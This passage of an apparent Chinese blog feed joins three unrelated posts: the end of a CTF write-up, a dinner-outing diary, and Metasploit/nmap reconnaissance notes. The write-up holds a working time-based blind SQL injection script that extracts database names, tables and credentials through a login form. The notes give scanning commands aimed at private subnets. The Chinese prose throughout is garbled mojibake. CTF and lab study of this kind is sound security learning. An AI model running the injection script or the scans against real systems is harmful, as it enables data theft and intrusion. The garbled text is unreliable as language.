&quot;</span> + wh + <span class="string">&quot;: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">wh</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">150</span>):</span><br><span class="line">        new = get_char(j, wh)</span><br><span class="line">        <span class="keyword">if</span> new <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += new</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data for &quot;</span> + wh + <span class="string">&quot;: &quot;</span> + name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_char</span>(<span class="params">index, wh</span>):</span></span><br><span class="line">    minx = <span class="number">32</span></span><br><span class="line">    maxx = <span class="number">127</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> minx &lt; maxx:</span><br><span class="line">        i = (minx + maxx) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> a == i:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">chr</span>(i)</span><br><span class="line">        data[<span class="string">&quot;username&quot;</span>] = get_random_username()</span><br><span class="line">        data[<span class="string">&quot;password&quot;</span>] = payload_data[wh] % (index, i)</span><br><span class="line">        t1 = datetime.datetime.now()</span><br><span class="line">        conn = requests.post(url, data=data)</span><br><span class="line">        t2 = datetime.datetime.now()</span><br><span class="line">        sec = (t2 - t1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &lt; <span class="number">1</span>:</span><br><span class="line">            minx = i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maxx = i</span><br><span class="line">        a = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># å“åº”è¶…æ—¶å¯¼è‡´è¿”å›ä¸å¯¹å¾ˆæ­£å¸¸ï¼Œå¤šæå‡ æ¬¡å§ï¼Œå¤§æ¦‚æ’å…¥ 800+ è¡Œå°±ä¼šæ¶ç–¾é¢‘å‘ï¼Œé‡å¯é¶æœºå§</span></span><br><span class="line">    <span class="comment"># get_length(&quot;database&quot;)</span></span><br><span class="line">    <span class="comment"># database: 17</span></span><br><span class="line">    <span class="comment"># user: 15</span></span><br><span class="line">    <span class="comment"># version: 6</span></span><br><span class="line">    get_data(<span class="string">&quot;flags_flag&quot;</span>)</span><br><span class="line">    <span class="comment"># database: fiveonefivemanage</span></span><br><span class="line">    <span class="comment"># user: admin@localhost</span></span><br><span class="line">    <span class="comment"># version: 5.7.26</span></span><br><span class="line">    <span class="comment"># schemata0: information_schema</span></span><br><span class="line">    <span class="comment"># schemata1: fiveonefivemanage</span></span><br><span class="line">    <span class="comment"># schemata2ï¼šmysql</span></span><br><span class="line">    <span class="comment"># schemata3ï¼šperformance_schema</span></span><br><span class="line">    <span class="comment"># schemata4ï¼šsys</span></span><br><span class="line">    <span class="comment"># tables0: users</span></span><br><span class="line">    <span class="comment"># tables1: usfffffffffffffffffffflllllllllllaaaaaaaaaaaaaaggggggggggggg</span></span><br><span class="line">    <span class="comment"># columns0_users: username</span></span><br><span class="line">    <span class="comment"># columns1_users: password</span></span><br><span class="line">    <span class="comment"># columns0_flagsï¼šflag</span></span><br><span class="line">    <span class="comment"># users_username_password_0:</span></span><br><span class="line">    <span class="comment"># users_username_password_1:</span></span><br><span class="line">    <span class="comment"># users_username_password_2:</span></span><br><span class="line">    <span class="comment"># users_username_password_3:</span></span><br><span class="line">    <span class="comment"># users_username_password_4:</span></span><br><span class="line">    <span class="comment"># users_username_password_5:</span></span><br><span class="line">    <span class="comment"># flags_flag:</span></span><br></pre></td></tr></table></figure><p>è°­æ€»ï¼šâ€œä½ æè¿™å…»è›Šå‘¢ï¼Œè‡ªå·±æ—¥è‡ªå·±çš„é¡¹ç›®ã€‚â€ï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œè¿˜æ˜¯å¾ˆæœ‰æ„æ€ï¼Œå½³äºï¼Œï¼ˆå„ä½å¸ˆå‚…åˆ«æ‰“æˆ‘ï¼Œæˆ‘å°±ä¸€äººç•œæ— å®³çš„å‡ºé¢˜äººï¼Œæºœäº†æºœäº†ï¼‰</p><h2 id="PWN-æœ‰æ‰‹å°±è¡Œçš„-ez-nc"><a href="#PWN-æœ‰æ‰‹å°±è¡Œçš„-ez-nc" class="headerlink" title="PWN-æœ‰æ‰‹å°±è¡Œçš„ ez_nc"></a>PWN-æœ‰æ‰‹å°±è¡Œçš„ ez_nc</h2><p>è¿™é¢˜ç­¾åˆ°ï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œåº”è¯¥ä¸ä¼šæœ‰äººæ‰¾ä¸åˆ° flag å§ğŸ¤­ï¼ˆå˜»å˜».jpgï¼‰</p><p><code>cat /bin/tac</code> å³å¯è·å¾— flagï¼ˆæç¤ºä¹Ÿè¯´æ˜äº†ï¼Œcat åè¿‡æ¥ï¼Œä¸å°±æ˜¯ tac å˜›</p><p>è´´ä¸€ä¸‹ start.sh å§ï¼Œæˆ‘çš„å¾—æ„ä¹‹ä½œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line"></span><br><span class="line">mkdir -p /home/ctf/tmp</span><br><span class="line">mkdir -p /home/ctf/mnt</span><br><span class="line"><span class="built_in">echo</span> `date +%s | sha256sum | base64 | head -c 32 ; <span class="built_in">echo</span>` &gt; /home/ctf/tmp/1.txt</span><br><span class="line">sleep 1</span><br><span class="line"><span class="built_in">echo</span> `date +%s | sha256sum | base64 | head -c 32 ; <span class="built_in">echo</span>` &gt; /home/ctf/tmp/2.txt</span><br><span class="line">sleep 1</span><br><span class="line"><span class="built_in">echo</span> `date +%s | sha256sum | base64 | head -c 32 ; <span class="built_in">echo</span>` &gt; /home/ctf/tmp/3.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/mnt/c/`cat /home/ctf/tmp/1.txt`/d/`cat /home/ctf/tmp/2.txt`/e/`cat /home/ctf/tmp/3.txt`/&quot;</span> &gt; /home/ctf/tmp/1.exe</span><br><span class="line">mkdir -p /home/ctf`cat /home/ctf/tmp/1.exe`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;gong xi ni!!!!!!bu there is no flag!!!xpctf&#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#125;&quot;</span> &gt; /home/ctf`cat /home/ctf/tmp/1.exe`/flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/flag</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;but this is a fake flag&quot;</span> &gt;&gt; /home/ctf/flag</span><br><span class="line"></span><br><span class="line">rm -rf /home/ctf/tmp/*</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1000`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        mkdir -p /home/ctf/tmp/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/tmp/<span class="variable">$i</span>/flag</span><br><span class="line">        mkdir -p /home/ctf/etc/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/etc/<span class="variable">$i</span>/flag.txt</span><br><span class="line">        mkdir -p /home/ctf/mnt/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/<span class="variable">$i</span>/flag.exe</span><br><span class="line">        mkdir -p /home/ctf/mnt/c/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/c/<span class="variable">$i</span>/flag.list</span><br><span class="line">        mkdir -p /home/ctf/mnt/c/d/e/f/h/i/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/c/d/e/f/h/i/flag.source</span><br><span class="line">        mkdir -p /home/ctf/mnt/`<span class="built_in">echo</span> <span class="string">&#x27;c&#x27;</span>+<span class="variable">$i</span>`/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/`<span class="built_in">echo</span> <span class="string">&#x27;c&#x27;</span>+<span class="variable">$i</span>`/flag.dui</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /home/ctf/bin/tac</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am so soooooooooooooooooooooooooooooooorry to zhe mo you so jiu~~~~~flag give you~o&quot;</span> &gt;&gt; /home/ctf/bin/tac</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;flag_Du1L0v3lOVeYou&#125;&quot;</span> &gt; /home/ctf/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hint: sha bi cai hui xin you hint, qian dao ti ye xiang yao hint? guai guai zhao bei, xi xi xi, but my cat is a little tiao pi, he like reverse&quot;</span> &gt; /home/ctf/hint.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># start ctf-xinetd</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">trap</span> : TERM INT;</span><br><span class="line">sleep infinity &amp; <span class="built_in">wait</span>\</span><br></pre></td></tr></table></figure><p>çœŸçš„æºœäº† (0âˆš0)</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®ºä»é«˜æ¡£é¤å…åˆ°è¡—å¤´å°åƒçš„å¥‡å¦™ä¸€æ™š</title>
      <link href="2021/09/20/%E8%AE%BA%E4%BB%8E%E9%AB%98%E6%A1%A3%E9%A4%90%E5%8E%85%E5%88%B0%E8%A1%97%E5%A4%B4%E5%B0%8F%E5%90%83%E7%9A%84%E5%A5%87%E5%A6%99%E4%B8%80%E6%99%9A/"/>
      <url>2021/09/20/%E8%AE%BA%E4%BB%8E%E9%AB%98%E6%A1%A3%E9%A4%90%E5%8E%85%E5%88%B0%E8%A1%97%E5%A4%B4%E5%B0%8F%E5%90%83%E7%9A%84%E5%A5%87%E5%A6%99%E4%B8%80%E6%99%9A/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©ä¸­ç§‹å‰å¤•ğŸŒ™ï¼Œç»å¯å®¤é‡Œçš„æŸä½ç‹æœ‹ç‹—å‹ç››æƒ…é‚€è¯·ï¼Œä¸€è¡Œäººå†³å®šæ˜¯å‰å¾€å¸‚ä¸­å¿ƒåƒé¡¿å¥½çš„ã€‚</p><p>åªèƒ½è¯´ï¼Œé„™äººæè®®çš„å°åƒè¡—è¢«å¿½è§†ï¼Œå¤§å®¶å¸Œæœ›åœ¨åº—å­é‡Œèƒ¡åƒæµ·å–ä¸€æ³¢ï¼Œä½†æ˜¯é€‰æ‹©å¾—ä¸æ˜¯å¾ˆæ­£ç¡®å•Šï¼Œä¸€ç¾¤æ²¡ğŸ’°çš„å€’éœ‰è›‹ï¼Œé€‰æ‹©äº†ä¸€å®¶å¾ˆéœ€è¦ğŸ’°çš„çƒ§çƒ¤åº—ï¼ˆä¼¼ä¹å«åšé»‘ğŸ‚çƒ§çƒ¤ï¼‰</p><p><img src="https://i.loli.net/2021/10/16/7hc25fTreP9LjBl.jpg"></p><p><img src="https://i.loli.net/2021/09/20/5vMmqO97k4L3QF8.jpg"></p><p>åªèƒ½è¯´äºå¾—äºšåŒ¹ï¼Œè¿˜æ²¡åƒé¥±ï¼Œä»–å¥¶å¥¶çš„ï¼Œç„¶åä¸€è¡Œäººç›´æ¥åƒä¸€æ³¢æ¥¼ä¸‹å°åƒè¡—ï¼Œæ’éª¨YYDS~</p><p><img src="https://i.loli.net/2021/10/16/uLKTJRelkhnzd2I.jpg"></p><p>è¿˜æ˜¯æµè½è¡—å¤´ç‹‚å•ƒæ’éª¨çš„æ„Ÿè§‰å¥½ï¼Œé¦™è€Œç¾å‘³ï¼Œæ— æ•Œ~</p><p><img src="https://i.loli.net/2021/10/16/j4ErqTmhQBeJXo6.jpg"></p><p>è¿˜æœ‰æ¢…å¹²èœæ‰£è‚‰ï¼ˆfrom æ¶¦ç”Ÿï¼Œä¿ºæ²¡æ°</p><p><img src="https://i.loli.net/2021/10/16/QbuXM2AmZCqgzHv.jpg"></p><p><img src="https://i.loli.net/2021/10/16/C8cGNiAX1Wx3Ldr.jpg"></p><p><img src="https://i.loli.net/2021/10/16/2yISJGdQpc6T9Eh.jpg"></p><p>å¾ˆçƒ­é—¹ï¼Œåˆ°å¤„è½¬ï¼Œå®Œäº‹ä»¥åæ¥åˆ°äº†æ±Ÿè¾¹ï¼Œæ•£æ­¥~å…¶ä»–äººéƒ½æŒºæçš„ï¼Œå°±ğŸ‘´å’Œæ¶¦ç”Ÿä¸€èµ·æ²¿æ±Ÿè¾¹æ•£äº†è€åŠå¤©æ­¥ï¼Œå›å¤´è·¯ä¸Šè¿˜è¿·è·¯å¤šè½¬äº†åŠå¤©ï¼Œä¸è¿‡ ly å’Œè€å´ä¸¤ä¸ªé€†å¤©æé‚£ up bigï¼Œå½“ç„¶é‚£å°±æ˜¯å¦ä¸€è¯´äº†ã€‚</p><p>æ‹äº†ç‚¹æ±Ÿè¾¹çš„é£æ™¯~</p><p><img src="https://i.loli.net/2021/10/16/1vqcXr2RgeBY3bj.jpg"></p><p>æ¡¥ä¸‹ã€‚</p><p><img src="https://i.loli.net/2021/10/16/khw5CeGgFIaOLnY.jpg"></p><p><img src="https://i.loli.net/2021/10/16/ckmyiKZOx2pISQV.jpg"></p><p><img src="https://i.loli.net/2021/10/16/d7e3JRj8N5PbCuc.jpg"></p><p>ä¸‹é¢è¿™ä¸ªæ˜¯æ–‡å’Œå‹ï¼Œå¿˜äº†æ˜¯å¹²å•¥çš„å»äº†ã€‚</p><p><img src="https://i.loli.net/2021/10/16/Fp9KlnZqWetOSx8.jpg"></p><p>çœ‹åˆ°äº†å­”æ˜ç¯è¿˜ã€‚</p><p><img src="https://i.loli.net/2021/10/16/9rdHQ6VaYAEgLbS.jpg"></p><p>æ€ä¹ˆè¯´å‘¢â€¦â€¦åªèƒ½è¯´ï¼Œè¿™èƒŒå½±å°±å¾ˆæ©çˆ±ğŸ§</p><p><img src="https://i.loli.net/2021/10/16/A6eGCF7aEuymDPR.jpg"></p><p><img src="https://i.loli.net/2021/10/16/C7YWKd4Za3wItGD.jpg"></p><p>@youdamao @oldwu ç¥ä½ ä»¬ç™¾å¹´å¥½åˆğŸˆğŸˆğŸˆ</p>]]></content>
      
      
      <categories>
          
          <category> çBB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é®¾é­è‚¾é€å­¦ä¹ </title>
      <link href="2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>èœé¸¡ç¬”è®°</p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>PowerShell åœ¨çº¿</p><p><a href="https://www.pstips.net/powershell-online-tutorials">https://www.pstips.net/powershell-online-tutorials</a></p><h3 id="è¢«åŠ¨ä¿¡æ¯æœé›†"><a href="#è¢«åŠ¨ä¿¡æ¯æœé›†" class="headerlink" title="è¢«åŠ¨ä¿¡æ¯æœé›†"></a>è¢«åŠ¨ä¿¡æ¯æœé›†</h3><h4 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; whois testfire.net</span><br></pre></td></tr></table></figure><h4 id="netcraft"><a href="#netcraft" class="headerlink" title="netcraft"></a>netcraft</h4><p><a href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com</a></p><h4 id="nslook"><a href="#nslook" class="headerlink" title="nslook"></a>nslook</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslook</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> <span class="built_in">type</span>=mx</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> testfire.net</span></span><br></pre></td></tr></table></figure><h4 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:tetfire.net login</span><br></pre></td></tr></table></figure><h3 id="ä¸»åŠ¨ä¿¡æ¯æœé›†"><a href="#ä¸»åŠ¨ä¿¡æ¯æœé›†" class="headerlink" title="ä¸»åŠ¨ä¿¡æ¯æœé›†"></a>ä¸»åŠ¨ä¿¡æ¯æœé›†</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -Pn -p1-65536 192.168.160.13</span><br><span class="line">nmap -Pn -sS- A -oX Subnet1.xml 192.168.160.0/24</span><br></pre></td></tr></table></figure><h5 id="tcp-ç©ºé—²æ‰«æ"><a href="#tcp-ç©ºé—²æ‰«æ" class="headerlink" title="tcp ç©ºé—²æ‰«æ"></a>tcp ç©ºé—²æ‰«æ</h5><p>å†’å……ç©ºé—²ä¸»æœº IP å¸§æ ‡è¯†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ip/ipidseq </span><br><span class="line">msf &gt; show options </span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threds 50</span><br><span class="line">msf &gt; run</span><br><span class="line">msf &gt; nmap -PN -sI 192.168.160.2 192.168.160.13</span><br></pre></td></tr></table></figure><h4 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msf &gt; db_connect postgres:postgres@127.0.0.1/msf</span><br><span class="line">msf &gt; db_status</span><br><span class="line">msf &gt; db_import /root/test/Subnet1.xml</span><br><span class="line">msf &gt; hosts -c address</span><br></pre></td></tr></table></figure><h4 id="ç»“åˆ-postgresql-ä¸-Nmap"><a href="#ç»“åˆ-postgresql-ä¸-Nmap" class="headerlink" title="ç»“åˆ postgresql ä¸ Nmap"></a>ç»“åˆ postgresql ä¸ Nmap</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_nmap -sS -A 192.168.160.13</span><br><span class="line">msf &gt; services -u</span><br></pre></td></tr></table></figure><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p>åˆ©ç”¨ msf æ¡†æ¶æä¾›çš„ç«¯å£æ‰«æå·¥å…·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search portscan</span><br><span class="line">msf &gt; use auxiliary/scanner/portscan/syn</span><br><span class="line">msf &gt; set rhosts 192.168.160.13</span><br><span class="line">msf &gt; set threads 50</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><h3 id="é’ˆå¯¹æ€§æ‰«æ"><a href="#é’ˆå¯¹æ€§æ‰«æ" class="headerlink" title="é’ˆå¯¹æ€§æ‰«æ"></a>é’ˆå¯¹æ€§æ‰«æ</h3><h4 id="æœåŠ¡å™¨æ¶ˆæ¯å—åè®®æ‰«æ"><a href="#æœåŠ¡å™¨æ¶ˆæ¯å—åè®®æ‰«æ" class="headerlink" title="æœåŠ¡å™¨æ¶ˆæ¯å—åè®®æ‰«æ"></a>æœåŠ¡å™¨æ¶ˆæ¯å—åè®®æ‰«æ</h4><p>smb_version æ¨¡å—å¯ä»¥éå†ç½‘ç»œå¹¶è·å– windows ç³»ç»Ÿç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set rhosts 192.168.160.13</span><br><span class="line">msf &gt; run</span><br><span class="line">msf &gt; hosts -u -c address,os_name,svcs,vulns,workspace</span><br></pre></td></tr></table></figure><p>å¿«é€Ÿä¸”å®‰å…¨å®šä½é«˜é£é™©ä¸»æœºçš„æ–¹æ³•</p><h4 id="æœç´¢é…ç½®ä¸å½“çš„-Microsoft-SQL-Server"><a href="#æœç´¢é…ç½®ä¸å½“çš„-Microsoft-SQL-Server" class="headerlink" title="æœç´¢é…ç½®ä¸å½“çš„ Microsoft SQL Server"></a>æœç´¢é…ç½®ä¸å½“çš„ Microsoft SQL Server</h4><p>MSSQL é»˜è®¤ 1433 ç«¯å£ï¼Œä½¿ç”¨ mssql_pingï¼ˆåˆ©ç”¨ UDP åè®®ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set threads 255</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p>ç”¨ä»¥åœ¨å¤§é‡ä¸»æœºå­ç½‘ä¸­æŸ¥æ‰¾ MSSQLï¼Œæ¯” Nmao é€ä¸€ç«¯å£æŸ¥æ‰¾å¿«å¾—å¤š</p><h4 id="SSH-æœåŠ¡å™¨æ‰«æ"><a href="#SSH-æœåŠ¡å™¨æ‰«æ" class="headerlink" title="SSH æœåŠ¡å™¨æ‰«æ"></a>SSH æœåŠ¡å™¨æ‰«æ</h4><p>ssh_version æ¨¡å—ç”¨ä»¥è¯†åˆ«ç›®æ ‡æœåŠ¡å™¨ä¸Šè¿è¡Œçš„ ssh ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf &gt; show option</span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threads 50</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p>å¦‚æœæœŸæœ›æ”»å‡»ä¸€ä¸ªç‰¹å®šç‰ˆæœ¬çš„ OpenSSH æœåŠ¡ç¨‹åºï¼Œå¯ä»¥å…ˆä½¿ç”¨ ssh_version æ‰«æ</p><h4 id="FTP-æ‰«æ"><a href="#FTP-æ‰«æ" class="headerlink" title="FTP æ‰«æ"></a>FTP æ‰«æ</h4><p>ftp_version æ¨¡å—å¯ä»¥å¯¹ FTP æœåŠ¡å™¨è¿›è¡Œæ‰«æè¯†åˆ«ä¸æŸ¥ç‚¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threads 255</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p>scanner/ftp/anomymous æ¨¡å—å¯ä»¥æ£€æŸ¥ FTP æœåŠ¡å™¨æ˜¯å¦å…è®¸åŒ¿åç”¨æˆ·ç™»å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/anonymous</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threads 50</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p>å¦‚æœæŠ¥å‘Šå…è®¸åŒ¿åç™»é™†ä¸”æ‹¥æœ‰è¯»å†™æƒé™ï¼Œå°±ç›¸å½“äºæˆ‘ä»¬å¯¹å…¶æ‹¥æœ‰å®Œå…¨è®¿é—®æƒé™</p><h4 id="ç®€å•ç½‘ç®¡åè®®æ‰«æ"><a href="#ç®€å•ç½‘ç®¡åè®®æ‰«æ" class="headerlink" title="ç®€å•ç½‘ç®¡åè®®æ‰«æ"></a>ç®€å•ç½‘ç®¡åè®®æ‰«æ</h4><p>å¯è®¿é—®çš„ SNMPï¼ˆç®€å•ç½‘ç®¡åè®®ï¼‰æœåŠ¡å™¨å¯ä»¥æ³„éœ²å¾ˆå¤šä¿¡æ¯ç”šè‡³å¯¼è‡´è®¾å¤‡è¢«è¿œç¨‹æ”»é™·</p><p>msf æ¡†æ¶ä¸­åŒ…å«äº†ä¸€ä¸ªå†…ç½®è¾…åŠ©æ¨¡å— scanner/snmp/snmp_enumï¼ŒRO ä¸ RW æƒé™çš„å›¢ä½“å­—ç¬¦ä¸²çŒœè§£ä¸è·å–å¾ˆé‡è¦</p><h2 id="å†…ç½‘ä¿¡æ¯æ”¶é›†"><a href="#å†…ç½‘ä¿¡æ¯æ”¶é›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æ”¶é›†"></a>å†…ç½‘ä¿¡æ¯æ”¶é›†</h2><h3 id="æœ¬æœºä¿¡æ¯æ”¶é›†"><a href="#æœ¬æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="æœ¬æœºä¿¡æ¯æ”¶é›†"></a>æœ¬æœºä¿¡æ¯æ”¶é›†</h3><h4 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 